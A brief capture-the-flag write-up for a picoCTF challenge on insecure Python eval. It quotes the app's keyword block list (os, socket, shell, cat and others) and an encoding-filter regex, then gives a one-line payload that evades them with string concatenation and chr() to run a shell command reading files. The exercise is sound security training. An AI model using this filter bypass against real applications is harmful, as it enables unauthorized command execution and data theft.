# URL
https://play.picoctf.org/practice/challenge/484
# Concept
* insecure Python eval functions
* filter bypass
# Method of solve
* in app, when we look at the source code, there are these comments:
```
<!--
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
-->
```
* this is a filter that disallows all the above keywords
* there is also a regex that filters out attempts to use URL encoding or hex encoding
* we can use character substitution using the `chr` function in Python to bypass the filters
```
 __import__('o'+'s').popen('ca' + 't ' + chr(47) + '*').read()
```

